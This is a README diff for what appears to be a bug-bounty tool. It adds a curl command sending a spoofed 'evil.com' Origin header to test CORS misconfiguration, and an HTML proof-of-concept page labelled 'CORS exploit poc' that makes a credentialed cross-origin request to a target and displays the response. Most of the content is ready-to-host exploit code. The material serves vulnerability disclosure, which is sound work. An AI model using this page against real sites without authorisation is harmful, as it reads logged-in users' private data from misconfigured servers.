@@ -1,6 +1,44 @@
 # CORS poc
 
-you cant create a website just for submitting a cors poc for a bug report, this html script will help you!
+Testing: curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'
+
+Check to see what the server responds with in the Access-Control-Allow-Origin: (if anything) and if so, check if Access-Control-Allow-Credentials: true is present.
+
+If it is trusting arbitrary origins with allow-credentials set to true, then host this HTML as a proof of concept.
+
+# code
+
+
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h1 style="color:black;">CORS exploit poc</h1>
+<h2 style="color:red;">Sensitive credentials</h2>
+<body style="background-color:white;">
+  <body background="https://www.keycdn.com/img/support/cors.png"
+  
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open("GET", "https://target.com/URL", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+ 
+</body>
+</html>
+
 
 # usage
 
